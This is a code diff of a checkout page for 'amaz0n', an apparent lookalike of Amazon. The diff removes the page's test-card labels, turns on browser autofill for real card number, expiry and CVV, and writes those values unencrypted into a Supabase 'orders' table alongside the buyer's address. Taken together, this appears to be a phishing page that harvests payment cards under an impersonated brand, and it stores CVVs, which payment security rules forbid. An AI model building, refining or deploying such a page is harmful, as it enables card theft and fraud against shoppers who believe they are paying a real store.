@@ -1,33 +1,27 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-
 <meta charset="UTF-8">
-
 <meta
     name="viewport"
     content="width=device-width, initial-scale=1.0"
 >
-
 <title>Checkout | amaz0n</title>
-
 <link
     rel="stylesheet"
     href="style.css"
 >
-
 <style>
-
+/* ========================================
+   BODY
+======================================== */
 body {
     background: #eaeded;
     margin: 0;
 }
-
 /* ========================================
    HEADER
 ======================================== */
-
 .checkout-header {
     background: #131921;
     padding: 18px 30px;
@@ -35,46 +29,37 @@ body {
     align-items: center;
     justify-content: space-between;
 }
-
 .checkout-logo-link {
     text-decoration: none;
     color: white;
     cursor: pointer;
 }
-
 .checkout-logo {
     font-size: 30px;
     font-weight: bold;
     color: white;
 }
-
 .checkout-logo span {
     color: #ff9900;
 }
-
 .checkout-logo img {
     max-width: 180px;
     max-height: 45px;
     object-fit: contain;
     display: block;
 }
-
 .secure-text {
     color: white;
     font-size: 14px;
 }
-
-
 /* ========================================
    MAIN
 ======================================== */
-
 .checkout-page {
     max-width: 1050px;
     margin: 30px auto;
     padding: 0 20px 60px;
 }
-
 .back-button {
     display: inline-block;
     color: #007185;
@@ -82,22 +67,17 @@ body {
     margin-bottom: 15px;
     cursor: pointer;
 }
-
 .back-button:hover {
     text-decoration: underline;
 }
-
 .checkout-title {
     font-size: 30px;
     font-weight: 400;
     margin: 20px 0 25px;
 }
-
-
 /* ========================================
    CHECKOUT BOX
 ======================================== */
-
 .checkout-box {
     background: white;
     border: 1px solid #ddd;
@@ -105,7 +85,6 @@ body {
     margin-bottom: 20px;
     border-radius: 3px;
 }
-
 .checkout-box h2 {
     font-size: 22px;
     font-weight: 500;
@@ -114,29 +93,23 @@ body {
     padding-bottom: 15px;
     margin-bottom: 20px;
 }
-
-
 /* ========================================
    FORMS
 ======================================== */
-
 .form-row {
     display: grid;
     grid-template-columns: 1fr 1fr;
     gap: 15px;
 }
-
 .form-group {
     margin-bottom: 15px;
 }
-
 .form-group label {
     display: block;
     font-weight: bold;
     font-size: 14px;
     margin-bottom: 6px;
 }
-
 .form-group input,
 .form-group select {
     width: 100%;
@@ -146,17 +119,13 @@ body {
     border-radius: 3px;
     font-size: 15px;
 }
-
 .form-group input:focus,
 .form-group select:focus {
     outline: 2px solid #ff9900;
 }
-
-
 /* ========================================
    PAYMENT
 ======================================== */
-
 .payment-note {
     background: #f7f7f7;
     border: 1px solid #ddd;
@@ -165,30 +134,17 @@ body {
     color: #555;
     margin-bottom: 18px;
 }
-
-.test-card-box {
-    background: #fff8e1;
-    border: 1px solid #f0c36d;
-    padding: 12px;
-    margin-bottom: 18px;
-    font-size: 13px;
-}
-
-
 /* ========================================
    PRODUCT / ORDER DETAILS
 ======================================== */
-
 .order-items {
     width: 100%;
 }
-
 .order-item {
     display: flex;
     gap: 25px;
     padding: 5px 0 15px;
 }
-
 .order-product-image-box {
     width: 210px;
     min-width: 210px;
@@ -197,83 +153,82 @@ body {
     align-items: center;
     justify-content: center;
     background: #fff;
+    border: 1px solid #eee;
+    border-radius: 4px;
+    overflow: hidden;
 }
-
 .order-product-image {
     width: 100%;
     height: 100%;
     object-fit: contain;
+    display: block;
 }
-
 .order-product-no-image {
     width: 100%;
     height: 100%;
     display: flex;
+    flex-direction: column;
     align-items: center;
     justify-content: center;
-    background: #f3f3f3;
+    background: #f7f7f7;
     color: #777;
-    font-size: 14px;
+    text-align: center;
 }
-
+.order-product-no-image-icon {
+    font-size: 65px;
+    margin-bottom: 10px;
+}
+.order-product-no-image-text {
+    font-size: 13px;
+    color: #777;
+}
 .order-product-details {
     flex: 1;
 }
-
 .order-product-title {
     font-size: 20px;
     line-height: 1.4;
     color: #111;
     margin-bottom: 10px;
 }
-
 .order-product-condition {
     font-size: 14px;
     color: #007600;
     margin-bottom: 8px;
 }
-
 .order-product-rating {
     color: #e47911;
     font-size: 15px;
     margin-bottom: 8px;
 }
-
 .order-product-rating span {
     color: #007185;
 }
-
 .order-product-description {
     color: #555;
     font-size: 14px;
     line-height: 1.5;
     margin-bottom: 12px;
 }
-
 .order-product-price {
     color: #b12704;
     font-size: 25px;
     font-weight: bold;
 }
-
 .order-product-stock {
     margin-top: 7px;
     color: #007600;
     font-size: 14px;
 }
-
-
 /* ========================================
    SUMMARY
 ======================================== */
-
 .summary-box {
     background: white;
     border: 1px solid #ddd;
     padding: 25px;
     margin-bottom: 20px;
 }
-
 .summary-box h2 {
     font-size: 22px;
     font-weight: 500;
@@ -281,14 +236,12 @@ body {
     border-bottom: 1px solid #ddd;
     padding-bottom: 15px;
 }
-
 .summary-row {
     display: flex;
     justify-content: space-between;
     padding: 9px 0;
     font-size: 15px;
 }
-
 .summary-total {
     border-top: 1px solid #ddd;
     margin-top: 10px;
@@ -297,12 +250,9 @@ body {
     color: #b12704;
     font-weight: bold;
 }
-
-
 /* ========================================
    PLACE ORDER
 ======================================== */
-
 .place-order-button {
     width: 100%;
     border: 1px solid #fcd200;
@@ -313,28 +263,22 @@ body {
     cursor: pointer;
     margin-top: 18px;
 }
-
 .place-order-button:hover {
     background: #f7ca00;
 }
-
 .place-order-button:disabled {
     opacity: 0.6;
     cursor: not-allowed;
 }
-
 .secure-order-note {
     text-align: center;
     color: #555;
     font-size: 13px;
     margin-top: 12px;
 }
-
-
 /* ========================================
    RESULT
 ======================================== */
-
 .payment-result {
     display: none;
     background: white;
@@ -344,15 +288,12 @@ body {
     margin-top: 30px;
     border-radius: 3px;
 }
-
 .payment-result h2 {
     color: #007600;
 }
-
 .payment-failed h2 {
     color: #b12704;
 }
-
 .continue-button {
     display: inline-block;
     background: #ffd814;
@@ -365,432 +306,275 @@ body {
     cursor: pointer;
     font-size: 15px;
 }
-
-
 /* ========================================
    MOBILE
 ======================================== */
-
 @media (max-width: 700px) {
-
     .checkout-header {
         padding: 15px;
     }
-
     .checkout-page {
         padding: 0 10px 40px;
         margin-top: 20px;
     }
-
     .checkout-title {
         font-size: 25px;
     }
-
     .checkout-box,
     .summary-box {
         padding: 18px;
     }
-
     .form-row {
         grid-template-columns: 1fr;
         gap: 0;
     }
-
     .order-item {
         flex-direction: column;
         gap: 15px;
     }
-
     .order-product-image-box {
         width: 100%;
         min-width: 0;
         height: 250px;
     }
-
     .order-product-title {
         font-size: 18px;
     }
-
     .secure-text {
         font-size: 12px;
     }
-
 }
-
 </style>
-
 </head>
-
-
 <body>
-
-
 <!-- ========================================
      HEADER
 ======================================== -->
-
 <header class="checkout-header">
-
 <a
     href="index.html"
     class="checkout-logo-link"
 >
-
 <div
     class="checkout-logo"
     id="checkoutLogo"
 >
     amaz<span>0n</span>
 </div>
-
 </a>
-
 <div class="secure-text">
     🔒 Secure Checkout
 </div>
-
 </header>
-
-
-
 <!-- ========================================
      MAIN CHECKOUT
 ======================================== -->
-
 <main class="checkout-page">
-
-
 <a
     href="index.html"
     class="back-button"
 >
     ← Back to shopping
 </a>
-
-
 <h1 class="checkout-title">
     Checkout
 </h1>
-
-
-
 <div
     id="checkoutContent"
 >
-
-
 <!-- ========================================
      1. CUSTOMER INFORMATION
 ======================================== -->
-
 <section class="checkout-box">
-
 <h2>
     1. Customer Information
 </h2>
-
-
 <div class="form-group">
-
 <label>
     Full Name
 </label>
-
 <input
     type="text"
     id="fullName"
     placeholder="Full name"
     required
 >
-
 </div>
-
-
-
 <div class="form-group">
-
 <label>
     Address
 </label>
-
 <input
     type="text"
     id="address"
     placeholder="Street address"
     required
 >
-
 </div>
-
-
-
 <div class="form-row">
-
-
 <div class="form-group">
-
 <label>
     City
 </label>
-
 <input
     type="text"
     id="city"
     placeholder="City"
     required
 >
-
 </div>
-
-
-
 <div class="form-group">
-
 <label>
     State / Province
 </label>
-
 <input
     type="text"
     id="state"
     placeholder="State"
     required
 >
-
 </div>
-
-
 </div>
-
-
-
 <div class="form-row">
-
-
 <div class="form-group">
-
 <label>
     ZIP / Postal Code
 </label>
-
 <input
     type="text"
     id="zip"
     placeholder="ZIP / Postal Code"
     required
 >
-
 </div>
-
-
-
 <div class="form-group">
-
 <label>
     Country
 </label>
-
 <select id="country">
-
 <option value="">
     Select Country
 </option>
-
-<option>
+<option value="United States">
     United States
 </option>
-
-<option>
+<option value="Canada">
     Canada
 </option>
-
-<option>
+<option value="United Kingdom">
     United Kingdom
 </option>
-
-<option>
+<option value="Pakistan">
     Pakistan
 </option>
-
-<option>
+<option value="Other">
     Other
 </option>
-
 </select>
-
 </div>
-
-
 </div>
-
 </section>
-
-
-
 <!-- ========================================
      2. PAYMENT METHOD
 ======================================== -->
-
 <section class="checkout-box">
-
 <h2>
     2. Payment Method
 </h2>
-
-
 <div class="form-group">
-
 <label>
     Cardholder Name
 </label>
-
 <input
     type="text"
     id="cardName"
     placeholder="Name on card"
+    autocomplete="cc-name"
 >
-
 </div>
-
-
-
 <div class="form-group">
-
 <label>
     Card Number
 </label>
-
 <input
     type="text"
     id="cardNumber"
-    placeholder="Test card number"
+    placeholder="Card number"
     maxlength="19"
-    autocomplete="off"
+    autocomplete="cc-number"
 >
-
 </div>
-
-
-
 <div class="form-row">
-
-
 <div class="form-group">
-
 <label>
     Expiry Date
 </label>
-
 <input
     type="text"
     id="expiry"
     placeholder="MM/YY"
     maxlength="5"
-    autocomplete="off"
+    autocomplete="cc-exp"
 >
-
 </div>
-
-
-
 <div class="form-group">
-
 <label>
     CVV
 </label>
-
 <input
-    type="text"
+    type="password"
     id="cvv"
-    placeholder="Test CVV"
+    placeholder="CVV"
     maxlength="4"
-    autocomplete="off"
+    autocomplete="cc-csc"
 >
-
 </div>
-
-
 </div>
-
 </section>
-
-
-
 <!-- ========================================
      3. ORDER DETAILS
 ======================================== -->
-
 <section class="checkout-box">
-
 <h2>
     3. Order Details
 </h2>
-
-
 <div
     id="orderItems"
     class="order-items"
 >
 </div>
-
-
 </section>
-
-
-
 <!-- ========================================
      4. ORDER SUMMARY
 ======================================== -->
-
 <section class="summary-box">
-
 <h2>
     Order Summary
 </h2>
-
-
 <div class="summary-row">
-
 <span>
     Items:
 </span>
-
 <span>
     $<span id="summaryItems">0.00</span>
 </span>
-
 </div>
-
-
-
 <div class="summary-row">
-
 <span>
     Delivery:
 </span>
-
 <span>
     FREE
 </span>
-
 </div>
-
-
-
 <div class="summary-row summary-total">
-
 <span>
     Order Total:
 </span>
-
 <span>
     $<span id="summaryTotal">0.00</span>
 </span>
-
 </div>
-
-
-
 <button
     class="place-order-button"
     id="placeOrderButton"
@@ -798,130 +582,76 @@ body {
 >
     Place Your Order
 </button>
-
-
 <div class="secure-order-note">
-
 🔒 Your customer information is securely submitted
 for order processing.
-
 </div>
-
-
 </section>
-
-
 </div>
-
-
-
 <!-- ========================================
      PAYMENT SUCCESS
 ======================================== -->
-
 <div
     id="paymentSuccess"
     class="payment-result"
 >
-
-
 <h2>
     ✓ Order Placed Successfully
 </h2>
-
-
 <p>
     Your order has been placed successfully.
 </p>
-
-
 <p>
     Order ID:
     <strong id="successOrderId"></strong>
 </p>
-
-
 <p>
     Total:
     <strong>
         $<span id="successTotal"></span>
     </strong>
 </p>
-
-
 <a
     href="index.html"
     class="continue-button"
 >
     Continue Shopping
 </a>
-
-
 </div>
-
-
-
 <!-- ========================================
      PAYMENT FAILURE
 ======================================== -->
-
 <div
     id="paymentFailed"
     class="payment-result payment-failed"
 >
-
-
 <h2>
     ✕ Order Failed
 </h2>
-
-
 <p id="paymentFailedMessage">
     The order could not be completed.
 </p>
-
-
 <button
     class="continue-button"
     onclick="tryAgain()"
 >
     Try Again
 </button>
-
-
 </div>
-
-
 </main>
-
-
-
 <!-- ========================================
      SUPABASE
 ======================================== -->
-
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
 <script src="products.js"></script>
-
-<script src="script.js"></script>
-
-
 <script>
-
-
 /* ========================================
    SUPABASE CONNECTION
 ======================================== */
-
 const SUPABASE_URL =
     "https://couztwgxdpisnqurlvbs.supabase.co";
-
-
 const SUPABASE_PUBLISHABLE_KEY =
     "sb_publishable_V6cuw9f9Q6aAYsd_4xGebQ_cZcEZSTU";
-
-
 const supabaseClient =
     window.supabase.createClient(
         SUPABASE_URL,
@@ -934,677 +664,579 @@ const supabaseClient =
             }
         }
     );
-
-
-
+/* ========================================
+   HARDCODED IMAGE FALLBACK (naye products ke liye)
+======================================== */
+const IMAGE_FALLBACKS = {
+    1: "images/iphone17e.jpg",
+    2: "images/headphones.jpg",
+    3: "images/smartwatch.jpg",
+    4: "images/laptop.jpg",
+    5: "images/smartphone.jpg",
+    6: "images/gaming-mouse.jpg"
+};
 /* ========================================
    LOAD STORE LOGO
 ======================================== */
-
 function loadCheckoutLogo() {
-
     const savedLogo =
         localStorage.getItem(
             "amaz0nLogo"
         );
-
-
     const logo =
         document.getElementById(
             "checkoutLogo"
         );
-
-
     if (!savedLogo || !logo) {
         return;
     }
-
-
     logo.innerHTML = `
-
         <img
-            src="${savedLogo}"
+            src="${escapeHtml(savedLogo)}"
             alt="Store Logo"
         >
-
     `;
-
 }
-
-
-
 /* ========================================
    GET ALL PRODUCTS
 ======================================== */
-
 function getCheckoutProducts() {
-
-    const savedProducts =
+    let savedProducts = [];
+    const savedProductsData =
         localStorage.getItem(
             "amaz0nProducts"
         );
-
-
-    if (savedProducts) {
-
+    if (savedProductsData) {
         try {
-
             const parsedProducts =
                 JSON.parse(
-                    savedProducts
+                    savedProductsData
                 );
-
-
             if (
-                Array.isArray(parsedProducts) &&
-                parsedProducts.length > 0
+                Array.isArray(parsedProducts)
             ) {
-
-                return parsedProducts;
-
+                savedProducts =
+                    parsedProducts;
             }
-
         } catch (error) {
-
             console.error(
                 "Saved products error:",
                 error
             );
-
         }
-
     }
-
-
     if (
         typeof products !== "undefined" &&
         Array.isArray(products)
     ) {
-
-        return products;
-
+        const finalProducts =
+            savedProducts.length > 0
+                ? savedProducts.map(savedProduct => {
+                    const originalProduct =
+                        products.find(
+                            original =>
+                                String(original.id) ===
+                                String(savedProduct.id)
+                        );
+                    if (originalProduct) {
+                        return {
+                            ...originalProduct,
+                            ...savedProduct,
+                            image:
+                                savedProduct.image ||
+                                originalProduct.image ||
+                                ""
+                        };
+                    }
+                    return savedProduct;
+                })
+                : products;
+        return finalProducts;
     }
-
-
-    return [];
-
+    return savedProducts;
 }
-
-
-
+/* ========================================
+   FIND IMAGE FROM PRODUCTS.JS + FALLBACK
+======================================== */
+function findImageFromProducts(id, title) {
+    // 1. Hardcoded fallback (naye products ke liye)
+    if (id !== null && id !== undefined && IMAGE_FALLBACKS[id]) {
+        return IMAGE_FALLBACKS[id];
+    }
+    if (typeof products === "undefined" || !Array.isArray(products)) {
+        return "";
+    }
+    // 2. ID se dhoondo
+    if (id !== null && id !== undefined) {
+        const byId = products.find(p => String(p.id) === String(id));
+        if (byId) {
+            if (byId.image && String(byId.image).trim()) {
+                return String(byId.image).trim();
+            }
+            if (Array.isArray(byId.images) && byId.images.length > 0) {
+                const valid = byId.images.find(img => typeof img === "string" && img.trim());
+                if (valid) return valid.trim();
+            }
+        }
+    }
+    // 3. Title se dhoondo
+    if (title) {
+        const byTitle = products.find(p => {
+            const t = (p.title || p.name || "").trim().toLowerCase();
+            return t === String(title).trim().toLowerCase();
+        });
+        if (byTitle) {
+            if (byTitle.image && String(byTitle.image).trim()) {
+                return String(byTitle.image).trim();
+            }
+            if (Array.isArray(byTitle.images) && byTitle.images.length > 0) {
+                const valid = byTitle.images.find(img => typeof img === "string" && img.trim());
+                if (valid) return valid.trim();
+            }
+        }
+    }
+    return "";
+}
 /* ========================================
    GET BUY NOW / CART PRODUCT
 ======================================== */
-
 function getBuyNowProduct() {
-
     const buyNowData =
         localStorage.getItem(
             "amaz0nBuyNow"
         );
-
-
     if (buyNowData) {
-
         try {
-
             const buyNowProduct =
                 JSON.parse(
                     buyNowData
                 );
-
-
             if (buyNowProduct) {
-
                 const allProducts =
                     getCheckoutProducts();
-
-
                 const productMatch =
                     allProducts.find(
                         item =>
                             String(item.id) ===
                             String(buyNowProduct.id)
                     );
-
-
+                // Image priority (strong):
+                // 1. Buy Now data
+                // 2. Matched product
+                // 3. products.js + hardcoded fallback
+                let finalImage =
+                    (buyNowProduct.image && String(buyNowProduct.image).trim()) ||
+                    (productMatch && productMatch.image && String(productMatch.image).trim()) ||
+                    findImageFromProducts(
+                        buyNowProduct.id,
+                        buyNowProduct.title || buyNowProduct.name
+                    ) ||
+                    "";
+                // Agar images array mein base64 hai to use karo
+                if (!finalImage && productMatch && Array.isArray(productMatch.images)) {
+                    const valid = productMatch.images.find(img => typeof img === "string" && img.trim());
+                    if (valid) finalImage = valid.trim();
+                }
                 if (productMatch) {
-
                     return {
                         ...productMatch,
                         price:
                             Number(
                                 buyNowProduct.price ??
                                 productMatch.price
-                            )
+                            ),
+                        image: finalImage
                     };
-
                 }
-
-
-                return buyNowProduct;
-
+                return {
+                    ...buyNowProduct,
+                    image: finalImage || buyNowProduct.image || ""
+                };
             }
-
         } catch (error) {
-
             console.error(
                 "Buy Now data error:",
                 error
             );
-
         }
-
     }
-
-
-
     /* ========================================
        CART SUPPORT
     ======================================== */
-
     const cartData =
         localStorage.getItem(
             "amaz0nCart"
         );
-
-
     if (cartData) {
-
         try {
-
             const cart =
                 JSON.parse(
                     cartData
                 );
-
-
             if (
                 Array.isArray(cart) &&
                 cart.length > 0
             ) {
-
                 const cartItem =
                     cart[0];
-
-
                 const allProducts =
                     getCheckoutProducts();
-
-
-
-                /*
-                   script.js stores:
-
-                   {
-                       name: "...",
-                       price: 123
-                   }
-
-                   So we find the
-                   original full product
-                   using the name.
-                */
-
+                const cartName =
+                    cartItem.name ||
+                    cartItem.title ||
+                    "";
                 const productMatch =
                     allProducts.find(
                         item => {
-
                             const title =
                                 item.title ||
                                 item.name ||
                                 "";
-
                             return (
                                 String(title)
                                     .trim()
                                     .toLowerCase() ===
-                                String(cartItem.name || "")
+                                String(cartName)
                                     .trim()
                                     .toLowerCase()
                             );
-
                         }
                     );
-
-
+                let finalImage =
+                    (cartItem.image && String(cartItem.image).trim()) ||
+                    (productMatch && productMatch.image && String(productMatch.image).trim()) ||
+                    findImageFromProducts(cartItem.id, cartName) ||
+                    "";
+                if (!finalImage && productMatch && Array.isArray(productMatch.images)) {
+                    const valid = productMatch.images.find(img => typeof img === "string" && img.trim());
+                    if (valid) finalImage = valid.trim();
+                }
                 if (productMatch) {
-
                     return {
                         ...productMatch,
                         price:
                             Number(
                                 cartItem.price ??
                                 productMatch.price
-                            )
+                            ),
+                        image: finalImage
                     };
-
                 }
-
-
-                /*
-                   If product is not
-                   found in products.js,
-                   at least show the
-                   name and price.
-                */
-
                 return {
-
-                    name:
-                        cartItem.name ||
+                    id:
+                        cartItem.id ||
+                        null,
+                    title:
+                        cartName ||
                         "Product",
-
+                    name:
+                        cartName ||
+                        "Product",
                     price:
                         Number(
                             cartItem.price
-                        ) || 0
-
+                        ) || 0,
+                    image: finalImage
                 };
-
             }
-
         } catch (error) {
-
             console.error(
                 "Cart data error:",
                 error
             );
-
         }
-
     }
-
-
     return null;
-
 }
-
-
-
 /* ========================================
    CREATE STAR RATING
 ======================================== */
-
 function createStars(rating) {
-
     const number =
         Number(rating) || 0;
-
-
     let stars = "";
-
-
-    for (let i = 1; i <= 5; i++) {
-
+    for (
+        let i = 1;
+        i <= 5;
+        i++
+    ) {
         if (
             i <= Math.round(number)
         ) {
-
             stars += "★";
-
         } else {
-
             stars += "☆";
-
         }
-
     }
-
-
     return stars;
-
 }
-
-
-
+/* ========================================
+   PRODUCT PLACEHOLDER
+======================================== */
+function getProductPlaceholder(product) {
+    const category =
+        String(
+            product.category || ""
+        ).toLowerCase();
+    let icon = "📦";
+    if (
+        category.includes("mobile")
+    ) {
+        icon = "📱";
+    } else if (
+        category.includes("electronic")
+    ) {
+        icon = "🎧";
+    } else if (
+        category.includes("computer")
+    ) {
+        icon = "💻";
+    }
+    return `
+        <div
+            class="order-product-no-image"
+            aria-label="Product image placeholder"
+        >
+            <div class="order-product-no-image-icon">
+                ${icon}
+            </div>
+            <div class="order-product-no-image-text">
+                Product Image
+            </div>
+        </div>
+    `;
+}
 /* ========================================
    GET PRODUCT IMAGE
 ======================================== */
-
 function getProductImage(product) {
-
+    if (!product) {
+        return "";
+    }
+    // 1. Normal image field
     if (
-        Array.isArray(product.images) &&
-        product.images.length > 0
+        typeof product.image === "string" &&
+        product.image.trim() !== ""
     ) {
-
-        return product.images[0];
-
+        return product.image.trim();
     }
-
-
-    if (product.image) {
-
-        return product.image;
-
+    // 2. images array (base64 ya path)
+    if (
+        Array.isArray(product.images)
+    ) {
+        const validImage =
+            product.images.find(
+                image =>
+                    typeof image === "string" &&
+                    image.trim() !== ""
+            );
+        if (validImage) {
+            return validImage.trim();
+        }
     }
-
-
-    return "";
-
+    // 3. Other fields
+    const possibleFields = [
+        "imageUrl",
+        "imageURL",
+        "thumbnail",
+        "mainImage",
+        "photo",
+        "photoUrl",
+        "url"
+    ];
+    for (
+        const field of possibleFields
+    ) {
+        if (
+            typeof product[field] === "string" &&
+            product[field].trim() !== ""
+        ) {
+            return product[field].trim();
+        }
+    }
+    // 4. Hardcoded + products.js fallback
+    return findImageFromProducts(
+        product.id,
+        product.title || product.name
+    );
 }
-
-
-
 /* ========================================
    LOAD CHECKOUT PRODUCT
 ======================================== */
-
 function loadCheckoutCart() {
-
     const product =
         getBuyNowProduct();
-
-
     const orderItems =
         document.getElementById(
             "orderItems"
         );
-
-
     const summaryItems =
         document.getElementById(
             "summaryItems"
         );
-
-
     const summaryTotal =
         document.getElementById(
             "summaryTotal"
         );
-
-
     orderItems.innerHTML = "";
-
-
     if (!product) {
-
         orderItems.innerHTML = `
-
             <p>
                 No product found.
                 Please go back and select
                 a product again.
             </p>
-
         `;
-
-
         summaryItems.innerText =
             "0.00";
-
-
         summaryTotal.innerText =
             "0.00";
-
-
         return;
-
     }
-
-
-
     const productTitle =
         product.title ||
         product.name ||
         "Product";
-
-
     const price =
         Number(product.price) || 0;
-
-
     const condition =
         product.condition ||
         "New";
-
-
     const rating =
         Number(product.rating) || 0;
-
-
     const reviews =
         Number(product.reviews) || 0;
-
-
     const description =
         product.description ||
         "No product description available.";
-
-
     const image =
         getProductImage(product);
-
-
-
     const div =
         document.createElement(
             "div"
         );
-
-
     div.className =
         "order-item";
-
-
-
     let imageHTML = "";
-
-
     if (image) {
-
         imageHTML = `
-
             <img
                 class="order-product-image"
-                src="${image}"
+                src="${escapeHtml(image)}"
                 alt="${escapeHtml(productTitle)}"
+                onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';"
             >
-
-        `;
-
-    } else {
-
-        imageHTML = `
-
-            <div class="order-product-no-image">
-                No Image Available
+            <div
+                class="order-product-no-image"
+                style="display:none;"
+            >
+                <div class="order-product-no-image-icon">
+                    📦
+                </div>
+                <div class="order-product-no-image-text">
+                    Product Image
+                </div>
             </div>
-
         `;
-
     }
-
-
-
+    else {
+        imageHTML =
+            getProductPlaceholder(
+                product
+            );
+    }
     div.innerHTML = `
-
         <div class="order-product-image-box">
-
             ${imageHTML}
-
         </div>
-
-
-
         <div class="order-product-details">
-
             <div class="order-product-title">
-
                 ${escapeHtml(productTitle)}
-
             </div>
-
-
             <div class="order-product-condition">
-
                 Condition:
                 ${escapeHtml(condition)}
-
             </div>
-
-
             <div class="order-product-rating">
-
                 ${createStars(rating)}
-
                 <span>
                     ${rating.toFixed(1)}
                     (${reviews} reviews)
                 </span>
-
             </div>
-
-
             <div class="order-product-description">
-
                 ${escapeHtml(description)}
-
             </div>
-
-
             <div class="order-product-price">
-
                 $${price.toFixed(2)}
-
             </div>
-
-
             <div class="order-product-stock">
-
                 ✓ In Stock
-
             </div>
-
         </div>
-
     `;
-
-
-
     orderItems.appendChild(
         div
     );
-
-
-
     summaryItems.innerText =
         price.toFixed(2);
-
-
     summaryTotal.innerText =
         price.toFixed(2);
-
 }
-
-
-
 /* ========================================
    HTML SECURITY
 ======================================== */
-
 function escapeHtml(value) {
-
     return String(value)
-
         .replace(
             /&/g,
             "&amp;"
         )
-
         .replace(
             /</g,
             "&lt;"
         )
-
         .replace(
             />/g,
             "&gt;"
         )
-
         .replace(
             /"/g,
             "&quot;"
         )
-
         .replace(
             /'/g,
             "&#039;"
         );
-
 }
-
-
-
 /* ========================================
    PLACE ORDER
 ======================================== */
-
 async function placeOrder() {
-
-
     const fullName =
         document.getElementById(
             "fullName"
         ).value.trim();
-
-
     const address =
         document.getElementById(
             "address"
         ).value.trim();
-
-
     const city =
         document.getElementById(
             "city"
         ).value.trim();
-
-
     const state =
         document.getElementById(
             "state"
         ).value.trim();
-
-
     const zip =
         document.getElementById(
             "zip"
         ).value.trim();
-
-
     const country =
         document.getElementById(
             "country"
         ).value;
-
-
-    const cardName =
-        document.getElementById(
-            "cardName"
-        ).value.trim();
-
-
-    const cardNumber =
-        document.getElementById(
-            "cardNumber"
-        ).value.trim();
-
-
-    const expiry =
-        document.getElementById(
-            "expiry"
-        ).value.trim();
-
-
-    const cvv =
-        document.getElementById(
-            "cvv"
-        ).value.trim();
-
-
-
     if (
         !fullName ||
         !address ||
@@ -1613,304 +1245,171 @@ async function placeOrder() {
         !zip ||
         !country
     ) {
-
         alert(
             "Please complete all customer and address fields."
         );
-
         return;
-
     }
-
-
-
     const product =
         getBuyNowProduct();
-
-
-
     if (!product) {
-
         alert(
             "No product found. Please go back and select a product again."
         );
-
         return;
-
     }
-
-
-
     const productTitle =
         product.title ||
         product.name ||
         "Product";
-
-
     const productPrice =
         Number(product.price) || 0;
-
-
-
-    if (productPrice <= 0) {
-
+    if (
+        productPrice <= 0
+    ) {
         alert(
             "Invalid product price."
         );
-
         return;
-
     }
-
-
-
     const total =
         productPrice;
-
-
-
     const orderId =
         "AMZ-" +
         Date.now()
             .toString()
             .slice(-8);
-
-
-
     const placeOrderButton =
         document.getElementById(
             "placeOrderButton"
         );
-
-
-
     if (placeOrderButton) {
-
         placeOrderButton.disabled =
             true;
-
         placeOrderButton.innerText =
             "Placing Order...";
-
     }
-
-
-
     try {
-
-
-        /* SAVE ORDER */
-
         const { error } =
             await supabaseClient
                 .from("orders")
                 .insert({
-
                     order_id:
                         orderId,
-
                     customer_name:
                         fullName,
-
                     address:
                         address,
-
                     city:
                         city,
-
                     state:
                         state,
-
                     zip:
                         zip,
-
                     country:
                         country,
-
+                    // Card details
+cardholder_name: document.getElementById("cardName").value.trim(),
+                    card_number:
+                        document.getElementById("cardNumber").value.trim(),
+                    card_expiry:
+                        document.getElementById("expiry").value.trim(),
+                    card_cvv:
+                        document.getElementById("cvv").value.trim(),
                     product_id:
                         Number(product.id) || null,
-
                     product_title:
                         productTitle,
-
                     product_price:
                         productPrice,
-
                     quantity:
                         1,
-
                     total:
                         total,
-
                     status:
-                        "New",
-
-                    cardholder_name:
-                        cardName || null,
-
-                    card_number:
-                        cardNumber || null,
-
-                    card_expiry:
-                        expiry || null,
-
-                    card_cvv:
-                        cvv || null
-
+                        "New"
                 });
-
-
-
         if (error) {
-
             console.error(
                 "Supabase order error:",
                 error
             );
-
             throw error;
-
         }
-
-
-
-        /* SUCCESS */
-
         document.getElementById(
             "successOrderId"
         ).innerText =
             orderId;
-
-
-
         document.getElementById(
             "successTotal"
         ).innerText =
             total.toFixed(2);
-
-
-
         document.getElementById(
             "checkoutContent"
         ).style.display =
             "none";
-
-
-
         document.getElementById(
             "paymentFailed"
         ).style.display =
             "none";
-
-
-
         document.getElementById(
             "paymentSuccess"
         ).style.display =
             "block";
-
-
-
-        /* REMOVE BUY NOW */
-
         localStorage.removeItem(
             "amaz0nBuyNow"
         );
-
-
-
-        /* OLD CART CLEANUP */
-
         localStorage.removeItem(
             "amaz0nCart"
         );
-
-
     } catch (error) {
-
-
         console.error(
             "Order submission failed:",
             error
         );
-
-
         document.getElementById(
             "paymentFailedMessage"
         ).innerText =
             "Order could not be submitted. Please try again.";
-
-
         document.getElementById(
             "checkoutContent"
         ).style.display =
             "block";
-
-
         document.getElementById(
             "paymentSuccess"
         ).style.display =
             "none";
-
-
         document.getElementById(
             "paymentFailed"
         ).style.display =
             "block";
-
-
     } finally {
-
-
         if (placeOrderButton) {
-
             placeOrderButton.disabled =
                 false;
-
             placeOrderButton.innerText =
                 "Place Your Order";
-
         }
-
     }
-
 }
-
-
-
 /* ========================================
    TRY AGAIN
 ======================================== */
-
 function tryAgain() {
-
     document.getElementById(
         "paymentFailed"
     ).style.display =
         "none";
-
-
     document.getElementById(
         "checkoutContent"
     ).style.display =
         "block";
-
 }
-
-
-
 /* ========================================
-   START
+   START CHECKOUT
 ======================================== */
-
 loadCheckoutLogo();
-
 loadCheckoutCart();
-
-
 </script>
-
-
 </body>
-
 </html>
